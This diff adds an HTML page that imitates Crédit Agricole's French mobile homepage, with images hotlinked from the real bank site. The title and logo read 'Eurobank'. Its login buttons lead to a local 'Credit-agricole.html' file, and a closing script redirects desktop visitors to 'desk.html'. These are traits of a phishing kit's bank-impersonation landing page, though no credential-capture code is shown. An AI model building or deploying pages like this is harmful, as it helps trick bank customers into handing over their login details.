@@ -1,0 +1,286 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Connexion -EUROBANK</title>
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+    }
+
+    body {
+      background-color: #f8fdfa;
+      color: #1b1f23;
+    }
+
+    .topbar {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      padding: 10px 16px;
+      background-color: #fff;
+      box-shadow: 0 2px 4px rgba(0,0,0,0.05);
+    }
+
+    .topbar img {
+      height: 34px;
+    }
+
+    .topbar i {
+      font-size: 22px;
+      color: #1b1f23;
+    }
+
+    .banner {
+      text-align: center;
+      padding: 24px 16px 10px;
+    }
+
+    .banner h2 {
+      font-size: 22px;
+      margin-bottom: 10px;
+      color: #1b1f23;
+    }
+
+    .btn-connect {
+      display: inline-block;
+      background-color: #007e66;
+      color: #fff;
+      padding: 10px 20px;
+      border: none;
+      border-radius: 8px;
+      font-size: 16px;
+      margin-top: 10px;
+      text-decoration: none;
+    }
+
+    .image-block {
+      text-align: center;
+      margin: 20px auto;
+    }
+
+    .image-block img {
+      max-width: 90%;
+      border-radius: 10px;
+    }
+
+    .assurance {
+      background-color: #e5f4f2;
+      padding: 20px 16px;
+      border-top: 1px solid #dceee9;
+    }
+
+    .assurance h3 {
+      font-size: 18px;
+      margin-bottom: 10px;
+    }
+
+    .assurance p {
+      font-size: 14px;
+      color: #444;
+    }
+
+    .assurance a {
+      color: #007e66;
+      text-decoration: underline;
+      display: inline-block;
+      margin-top: 8px;
+    }
+
+    .devis-options {
+      margin-top: 16px;
+    }
+
+    .devis-btn {
+      display: flex;
+      align-items: center;
+      padding: 12px;
+      background: white;
+      border: 1px solid #e0e0e0;
+      border-radius: 10px;
+      margin-bottom: 10px;
+      box-shadow: 0 1px 3px rgba(0,0,0,0.05);
+    }
+
+    .devis-btn i {
+      margin-right: 10px;
+      color: #007e66;
+    }
+
+    .highlight-card, .simulateur-section, .engagement-section, .app-section, .urgence-section {
+      background: white;
+      margin: 20px;
+      border-radius: 10px;
+      padding: 16px;
+      box-shadow: 0 1px 3px rgba(0,0,0,0.05);
+    }
+
+    .simulateur-btn, .urgence-btn {
+      display: flex;
+      align-items: center;
+      margin-top: 10px;
+      padding: 10px;
+      background-color: #f5f5f5;
+      border-radius: 8px;
+    }
+
+    .simulateur-btn i, .urgence-btn i {
+      margin-right: 10px;
+      color: #007e66;
+    }
+
+    .engagement-section ul {
+      padding-left: 20px;
+    }
+
+    .footer {
+      background: #0d1b2a;
+      color: white;
+      padding: 30px 16px;
+      text-align: center;
+    }
+
+    .footer i {
+      margin: 10px;
+      font-size: 20px;
+    }
+
+    .footer-section {
+      margin-top: 20px;
+    }
+
+    .footer-section h4 {
+      font-size: 16px;
+      margin: 10px 0;
+    }
+
+    .footer-section p {
+      font-size: 14px;
+      color: #ccc;
+    }
+    
+  </style>
+</head>
+<body>
+ <div class="topbar">
+    <i class="fas fa-bars"></i>
+    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/0/03/Eurobank_logo_2021.svg/3840px-Eurobank_logo_2021.svg.png" alt="Logo CA">
+    <a href="Credit-agricole.html"><i class="fas fa-user-circle"></i></a>
+  </div>
+  <div class="banner">
+    <h2>Choisissez un compte utile et qui vous ressemble</h2>
+    <a href="Credit-agricole.html" class="btn-connect">Me connecter</a>
+  </div>
+
+  <div class="image-block">
+    <img src="https://www.credit-agricole.fr/content/dam/assetsca/master/public/commun/images/homepage/hp-part/Famille-Deon-V2.jpg" alt="famille">
+  </div>
+
+  <div class="assurance">
+    <h3>Besoin d'une assurance ?</h3>
+    <p>Le Crédit Agricole vous assure dans votre quotidien.<br>Réalisez votre devis en ligne dès maintenant.</p>
+    <a href="#">Découvrez tous nos devis</a>
+
+    <div class="devis-options">
+      <div class="devis-btn">
+        <i class="fas fa-home"></i>
+        Devis assurance habitation
+      </div>
+      <div class="devis-btn">
+        <i class="fas fa-car"></i>
+        Devis assurance auto
+      </div>
+    </div>
+  </div>
+
+  <div class="highlight-card">
+    <strong style="background:#fff5d7; padding:2px 6px; border-radius:4px;">🔖 Jeune</strong>
+    <p><strong>Quand t'as pas un rond, une carte sans frais à l'étranger*, c'est carré !</strong></p>
+    <p style="font-size: 13px;">* Voir conditions sur site</p>
+    <a href="#" style="color: #007e66; font-size: 14px;">J'en profite</a>
+  </div>
+
+  <div class="highlight-card">
+    <strong style="background:#fff5d7; padding:2px 6px; border-radius:4px;">🔖 Assurance</strong>
+    <p><strong>Partez tranquille, on protège votre domicile</strong></p>
+    <p style="font-size: 13px;">Ma Protection Maison, télésurveillance 24h/24 contre les cambriolages et les incendies à partir de 21€/mois*</p>
+    <a href="#" style="color: #007e66; font-size: 14px;">En savoir plus</a>
+  </div>
+
+  <div class="simulateur-section">
+    <h3>Besoin d'un crédit ?</h3>
+    <p style="font-size: 14px;">Achat immobilier, études, retraite, achat de voiture, déménagement... réalisez rapidement une simulation en ligne.</p>
+    <a href="#" style="color: #007e66; font-size: 14px;">Découvrez tous nos simulateurs</a>
+
+    <div class="simulateur-btn">
+      <i class="fas fa-home"></i>
+      Simulateur prêt immobilier
+    </div>
+    <div class="simulateur-btn">
+      <i class="fas fa-tools"></i>
+      Simulateur crédit travaux
+    </div>
+  </div>
+
+  <div class="engagement-section">
+    <h3>Et si vous vous engagiez à nos côtés pour votre territoire ?</h3>
+    <ul>
+      <li>Pour prendre part aux décisions d’une banque dont près de 90% des résultats sont réinvestis dans des projets locaux</li>
+      <li>Pour avoir accès à des offres privilégiées : réductions, invitations à des événements exclusifs</li>
+      <li>Pour contribuer à des actions de solidarité simplement en souscrivant à nos offres</li>
+    </ul>
+    <a href="#" class="btn-connect" style="margin-top: 12px;">Rejoignez nos millions de sociétaires</a>
+  </div>
+
+  <div class="app-section" style="background:#003c3c; color:white; text-align:center; padding:20px; border-radius:10px;">
+    <h3>Application Ma Banque</h3>
+    <p style="font-size: 14px;">Votre quotidien bancaire en plus simple et plus rapide.</p>
+    <div style="margin:10px 0;">
+      <img src="https://upload.wikimedia.org/wikipedia/commons/7/78/Google_Play_Store_badge_EN.svg" alt="Google Play" height="30">
+      <img src="https://www.credit-agricole.fr/content/dam/assetsca/master/public/commun/component/App_Store_Badge_FR.svg" alt="App Store" height="30">
+    </div>
+    <img src="https://www.credit-agricole.fr/content/dam/assetsca/master/public/commun/images/homepage/hp-part/2024/regional/Reg_App_Ca.png" alt="Ma Banque App" style="width:80%; max-width:300px;">
+    <br><a href="#" style="color:white; text-decoration:underline;">Toutes nos applications</a>
+  </div>
+
+  <div class="urgence-section" style="background:#e0f2f1; text-align:center; padding:16px; border-radius:10px; margin: 20px;">
+    <h3><i class="fas fa-phone-volume"></i> Une urgence ?</h3>
+    <p style="font-size: 14px;">Déclaration de perte, vol de carte bancaire ou d’un chèque ? Nos centres d’appel sont là 24h/24 et 7j/7.</p>
+    <a href="#" class="btn-connect" style="background:#004d40;">Voir les numéros d'urgence</a>
+  </div>
+
+  <footer class="footer">
+    <div>
+      <i class="fab fa-facebook-f"></i>
+      <i class="fab fa-instagram"></i>
+      <i class="fab fa-youtube"></i>
+      <i class="fab fa-x-twitter"></i>
+      <i class="fab fa-tiktok"></i>
+    </div>
+    <div class="footer-section">
+      <h4>LE CRÉDIT AGRICOLE</h4>
+      <p>Relation banque client</p>
+      <p>Sites spécialisés</p>
+      <p>Accessibilité numérique</p>
+    </div>
+    <div class="footer-section">
+      <p style="font-size: 12px; color:#ccc;">MENTIONS LÉGALES</p>
+      <p style="font-size: 12px; color:#ccc;">COOKIES ET POLITIQUE DE PROTECTION DES DONNÉES PERSONNELLES DU SITE INTERNET</p>
+    </div>
+  </footer>
+</body>
+
+  <script>
+  const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+
+  if (!isMobile) {
+    // Redirection vers la version ordinateur
+    window.location.href = "desk.html";
+  }
+</script>
+</html>
